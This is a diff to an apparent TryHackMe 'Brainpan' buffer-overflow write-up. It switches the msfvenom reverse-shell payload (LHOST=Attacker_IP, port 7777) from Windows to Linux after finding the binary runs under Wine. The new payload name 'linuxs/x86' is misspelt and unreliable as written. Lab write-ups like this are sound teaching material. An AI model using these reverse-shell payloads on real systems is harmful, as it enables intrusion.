@@ -129,9 +129,17 @@ The best candidate was found at:
 
 0x311712f3 : "\xff\xe4" |  {PAGE_EXECUTE_READ} [brainpan] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0- (C:\Users\Administrator\Desktop\TRYHACKME CTF\Brainpan\brainpan.exe), 0x0
 ```
-Then that just leads us to preparing a shell code we know its windows so:
+### Corrected Logic for the Shellcode Decision (Brainpan)
+With the offset, bad chars, and JMP ESP gadget confirmed, the next step was generating shellcode.
+- The Brainpan binary itself is a Windows PE32 executable, which initially suggested using a Windows payload.
+- However, the service running on port 9999 behaved like a Linux process, and Nmap OS detection was inconclusive.
+
+After gaining limited access, the directory structure starting with /home/puck/ was a clear indicator of linux, the presence of checksrv.sh (a Bash script) and the fact that the Windows binary was being executed under Wine made the environment clear: The host OS is Linux, the Windows binary is running via Wine. Because Wine executes Windows binaries inside a Linux process, the payload must match the host OS architecture, not the PE file format.
+
+- Therefore, using a Windows payload (windows/shell_reverse_tcp) was incorrect.
+- The correct payload is a Linux x86 reverse shell, avoiding only \x00:
 ```
-msfvenom -p windows/shell_reverse_tcp LHOST=Attacker_IP LPORT=7777 -b "\x00" -f c   
+msfvenom -p linuxs/x86/shell_reverse_tcp LHOST=Attacker_IP LPORT=7777 -b "\x00" -f c   
 ```
 Then implement the combined python code: 
 ```
@@ -157,21 +165,21 @@ except:
 	sys.exit()
 ```
 ### Reverse shell success
-
-First thing I notice and learnt was whoami failed. Turns out whoami did not exist in early Windows NT (NT 3.x / NT 4.0 era). It was introduced much later (Windows XP / Server 2003).
-The closest it had was echo %USERNAME% and hostname which work in all later versions of windows.
-
-Next check set to see environment variables, ver to see the OS version, tasklist to list running processes.
-
-Three things:
-- Script Checksrv.sh appears to keep brainpan.exe and SimpleHTTPServer running.
-- This appears to be running these in wine.
-- /home/... is common home directory in linux
 ```
-Z:\home\puck>type checsrv.sh
-File not found.
+Z:\home\puck>dir
+Volume in drive Z has no label.
+Volume Serial Number is 0000-0000
 
-Failed to open 'checsrv.sh'
+Directory of Z:\home\puck
+...
+  3/6/2013   3:23 PM           513  checksrv.sh
+  3/4/2013   2:45 PM  <DIR>         web
+       1 file                       513 bytes
+       3 directories     13,805,817,856 bytes free
+
+# 2 thingds of interest:
+#      - web directory that held same web page content shown in browser on port 10000
+#      - checksrv.sh, to keep winserver and simpleHTTPServer running
 
 Z:\home\puck>type checksrv.sh
 #!/bin/bash
@@ -197,9 +205,8 @@ if [[ $? -eq 1 ]]; then
         cd /home/puck/web
         /usr/bin/python -m SimpleHTTPServer 10000
 fi 
-
-Z:\home\puck>
 ```
+
 ### Mona Commands some interesting too look into
 1. !mona bytearray -b "\x00"
 Purpose:  
